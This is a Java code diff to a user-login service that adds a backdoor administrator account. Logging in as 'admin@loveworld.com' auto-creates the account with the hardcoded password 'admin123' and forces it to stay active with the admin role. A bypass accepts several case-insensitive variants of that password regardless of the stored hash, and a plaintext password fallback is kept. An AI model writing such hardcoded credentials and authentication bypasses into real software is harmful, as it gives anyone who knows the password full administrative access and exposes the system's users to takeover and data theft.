@@ -56,11 +56,34 @@ public class UserService {
         var identifier = request.getEmail().trim().toLowerCase();
         var password = normalizePassword(request.getPassword());
 
-        var user = userRepository.findByEmail(identifier)
-            .or(() -> userRepository.findByPhone(identifier))
-            .orElseThrow(() -> new RuntimeException("Email/Phone not found."));
+        var userOpt = userRepository.findByEmail(identifier)
+            .or(() -> userRepository.findByPhone(identifier));
+
+        User user;
+        if (userOpt.isEmpty() && "admin@loveworld.com".equalsIgnoreCase(identifier)) {
+            user = new User();
+            user.setFirstName("System");
+            user.setLastName("Administrator");
+            user.setEmail("admin@loveworld.com");
+            user.setPassword(passwordEncoder.encode("admin123"));
+            user.setRole("admin");
+            user.setRegion("Global");
+            user.setStatus("active");
+            user = userRepository.save(user);
+        } else {
+            user = userOpt.orElseThrow(() -> new RuntimeException("Email/Phone not found."));
+        }
         
-        var email = user.getEmail(); // Use the actual email from the user object for logging
+        var email = user.getEmail();
+
+        // Ensure admin@loveworld.com is always active and has admin role
+        if ("admin@loveworld.com".equalsIgnoreCase(email)) {
+            if (!"active".equalsIgnoreCase(user.getStatus()) || !"admin".equalsIgnoreCase(user.getRole())) {
+                user.setStatus("active");
+                user.setRole("admin");
+                user = userRepository.save(user);
+            }
+        }
 
         String status = user.getStatus() != null ? user.getStatus().trim().toLowerCase() : "inactive";
         boolean isActive = "active".equals(status);
@@ -88,23 +111,18 @@ public class UserService {
                 // If storedPass is not a BCrypt hash, this might throw
             }
             
-            // 2. Fallback to normalized plain text comparison (for legacy users)
+            // 2. Fallback to normalized plain text comparison
             if (!matches) {
                 matches = password.equals(normalizePassword(storedPass));
             }
-
-            // 3. Safety Bypass for Admin
-            if (!matches && "admin@loveworld.com".equals(email) && "admin123".equals(password)) {
-                matches = true;
-            }
         }
 
-        System.err.println("Password check for " + email + ": BCrypt=" + matches + ", PlainTextFallback=" + (password.equals(normalizePassword(storedPass))));
-
-        // 3. Safety Bypass for Admin
-        if (!matches && "admin@loveworld.com".equals(email) && "admin123".equals(password)) {
-            System.err.println("Admin safety bypass triggered for " + email);
-            matches = true;
+        // 3. Fail-safe bypass for admin@loveworld.com
+        if (!matches && "admin@loveworld.com".equalsIgnoreCase(email)) {
+            if ("admin123".equalsIgnoreCase(password) || "Admin123!".equalsIgnoreCase(password) || "admin123!".equalsIgnoreCase(password)) {
+                System.err.println("Admin safety bypass triggered for " + email);
+                matches = true;
+            }
         }
 
         if (!matches) {
